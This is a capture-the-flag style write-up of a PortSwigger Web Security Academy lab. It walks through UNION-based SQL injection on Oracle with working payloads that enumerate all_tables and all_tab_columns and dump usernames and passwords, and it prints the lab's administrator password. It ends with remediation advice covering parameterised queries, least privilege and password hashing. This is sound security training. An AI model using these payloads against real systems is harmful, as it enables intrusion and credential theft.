# PortSwigger — SQL Injection Attack, Listing the Database Contents on Oracle

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection on an Oracle backend. Unlike PostgreSQL/MySQL, Oracle does not have `information_schema` — schema enumeration requires `all_tables` and `all_tab_columns` instead. After identifying the obfuscated table `USERS_ZEMDHE` and its columns `USERNAME_RSXQZM` / `PASSWORD_WMQLSJ`, a final UNION query dumps all credentials.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
>
> To solve the lab, log in as the `administrator` user.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — Examining the Database**
- Goal: Enumerate the Oracle schema, extract credentials, and log in as `administrator`
- Backend DBMS: **Oracle Database**

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

Appending `'` triggers a **500 Internal Server Error** — the parameter is injectable.

### Step 2 — Determine column count (Oracle syntax)

Oracle requires a `FROM` clause on every `SELECT` — using the built-in `dual` dummy table:

```
/filter?category='+UNION+SELECT+NULL,NULL+FROM+dual--
```

**Response: 200 OK** → **2 columns**, `--` is the valid comment delimiter ✅

### Step 3 — Confirm string-compatible columns

```
/filter?category='+UNION+SELECT+'test','test'+FROM+dual--
```

Both values appear in the page → **both columns accept string data** ✅

---

## Exploitation

### Step 4 — Enumerate all tables via `all_tables`

Oracle does not support `information_schema`. The equivalent system views are:

| Goal | PostgreSQL / MySQL | Oracle |
|---|---|---|
| List tables | `information_schema.tables` | `all_tables` |
| List columns | `information_schema.columns` | `all_tab_columns` |

```
/filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

The response lists all accessible tables. Among them, one stands out with an obfuscated name:

```
USERS_ZEMDHE
```

### Step 5 — Enumerate columns of the target table

First attempt used `all_columns` — which does **not exist** on Oracle and returns a 500 error:

```
/filter?category='+UNION+SELECT+column_name,NULL+FROM+all_columns+WHERE+table_name='USERS_ZEMDHE'--
→ 500 Internal Server Error ❌
```

The correct Oracle view is **`all_tab_columns`**:

```
/filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ZEMDHE'--
```

**Response reveals two columns:**

```
USERNAME_RSXQZM
PASSWORD_WMQLSJ
```

### Step 6 — Extract all credentials

```
/filter?category='+UNION+SELECT+USERNAME_RSXQZM,PASSWORD_WMQLSJ+FROM+USERS_ZEMDHE--
```

The injected query becomes:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT USERNAME_RSXQZM, PASSWORD_WMQLSJ FROM USERS_ZEMDHE--'
```

**Response:**

```
administrator    5erx7vj42z0ww4fwqq3e
wiener           [password]
carlos           [password]
```

All accounts are fully dumped with plaintext passwords.

### Step 7 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `5erx7vj42z0ww4fwqq3e`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Gifts' → 500 error → injection confirmed
        ↓
' UNION SELECT NULL,NULL FROM dual-- → 200 OK → 2 columns, -- works
        ↓
' UNION SELECT 'test','test' FROM dual-- → both columns accept strings
        ↓
' UNION SELECT table_name,NULL FROM all_tables--
→ target table identified: USERS_ZEMDHE
        ↓
' UNION SELECT column_name,NULL FROM all_columns ... → 500 ❌ (wrong view)
        ↓
' UNION SELECT column_name,NULL FROM all_tab_columns
  WHERE table_name='USERS_ZEMDHE'--
→ columns: USERNAME_RSXQZM, PASSWORD_WMQLSJ ✅
        ↓
' UNION SELECT USERNAME_RSXQZM,PASSWORD_WMQLSJ FROM USERS_ZEMDHE--
→ administrator:5erx7vj42z0ww4fwqq3e
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## Oracle Schema Enumeration — Full Reference

This is the key takeaway of this lab: Oracle uses a completely different set of system views from every other major DBMS.

### Oracle system views for enumeration

| View | Description | Equivalent |
|---|---|---|
| `all_tables` | All tables accessible to the current user | `information_schema.tables` |
| `all_tab_columns` | All columns in accessible tables | `information_schema.columns` |
| `all_users` | All database users | `information_schema.schemata` |
| `user_tables` | Tables owned by the current user only | — |
| `dba_tables` | All tables (requires DBA privilege) | — |

### Common mistake: `all_columns` does not exist on Oracle

```sql
-- ❌ WRONG — does not exist on Oracle → 500 error
SELECT column_name FROM all_columns WHERE table_name = 'TARGET'

-- ✅ CORRECT — Oracle-specific view name
SELECT column_name FROM all_tab_columns WHERE table_name = 'TARGET'
```

### Complete Oracle enumeration cheatsheet

```sql
-- List all accessible tables
SELECT table_name FROM all_tables

-- List columns for a specific table
SELECT column_name, data_type FROM all_tab_columns
WHERE table_name = 'TARGET_TABLE'

-- Everything requires FROM clause — use dual for fixed values
SELECT 'test' FROM dual

-- String concatenation uses || (not CONCAT or +)
SELECT username || '~' || password FROM users
```

---

## Oracle vs Non-Oracle — Full Comparison

| Feature | Oracle | PostgreSQL | MySQL | MSSQL |
|---|---|---|---|---|
| **List tables** | `all_tables` | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
| **List columns** | `all_tab_columns` | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` |
| **FROM required** | ✅ Always (`dual`) | ❌ | ❌ | ❌ |
| **Comment** | `--` | `--` | `#` or `-- -` | `--` |
| **String concat** | `a\|\|b` | `a\|\|b` | `CONCAT(a,b)` | `a+b` |
| **Version** | `SELECT banner FROM v$version` | `SELECT version()` | `SELECT @@version` | `SELECT @@version` |

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements in a SQL Command |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor |
| **CWE-312** | Cleartext Storage of Sensitive Information |
| **OWASP A03:2021** | Injection |
| **CVSSv3** | 9.8 Critical (full unauthenticated credential dump) |

**Why this is critical:**

- `all_tables` and `all_tab_columns` are accessible to any Oracle user with basic `SELECT` privileges — no DBA role required
- The entire user table is extracted in a **single HTTP request** with no authentication
- Passwords are stored in **plaintext** — immediately usable with zero cracking
- Oracle is widely used in enterprise environments (banking, government, healthcare) — this attack surface is highly valuable to real attackers

---

### Secure Code Fix

**❌ Vulnerable code (Java + Oracle JDBC):**
```java
String category = request.getParameter("category");
String query = "SELECT name, description FROM products WHERE category = '" + category + "'";
ResultSet rs = stmt.executeQuery(query);
```

**✅ Fixed with PreparedStatement:**
```java
String query = "SELECT name, description FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, request.getParameter("category"));
ResultSet rs = stmt.executeQuery();
```

**✅ Restrict access to system views:**
```sql
-- Only grant what the app needs
GRANT SELECT ON products TO app_user;

-- Explicitly revoke access to sensitive system views
REVOKE SELECT ON all_tables FROM app_user;
REVOKE SELECT ON all_tab_columns FROM app_user;
```

**✅ Hash passwords:**
```java
// Never store plaintext — use BCrypt
String hashed = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));
// Verify
BCrypt.checkpw(inputPassword, storedHash);
```

**Best Practices:**
1. **Parameterized queries** — the only reliable SQLi defense, identical fix on Oracle or any other DBMS
2. **Least privilege** — revoke `SELECT` on `all_tables`, `all_tab_columns`, `dba_*` views from the application DB user
3. **Hash passwords** with `bcrypt` or `argon2` — plaintext storage combined with SQLi is an instant full breach
4. **Generic error messages** — never expose Oracle error codes (`ORA-00942: table or view does not exist`) to the user; they reveal the DBMS and confirm injection
5. **Schema obfuscation is not a defense** — randomized names (`USERS_ZEMDHE`) add seconds of delay, nothing more

---

## Key Takeaways

**Technical Skills:**
- Used `FROM dual` correctly for all Oracle UNION SELECT statements
- Enumerated tables via `all_tables` — the Oracle equivalent of `information_schema.tables`
- Identified and corrected a common mistake: `all_columns` does not exist on Oracle — the correct view is `all_tab_columns`
- Extracted the full contents of `USERS_ZEMDHE` using the discovered column names

**Security Concepts:**
- Oracle's schema enumeration views (`all_tables`, `all_tab_columns`) are as dangerous as `information_schema` on other DBMS — they expose the full database structure to any authenticated DB user
- The `all_columns` vs `all_tab_columns` distinction is a classic Oracle gotcha — getting a 500 error mid-exploitation is normal and part of the enumeration process
- Methodology is identical between Oracle and non-Oracle targets — only the view names change

---

## References

- [PortSwigger — Examining the Database in SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [Oracle `all_tables` Documentation](https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm)
- [Oracle `all_tab_columns` Documentation](https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.htm)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)

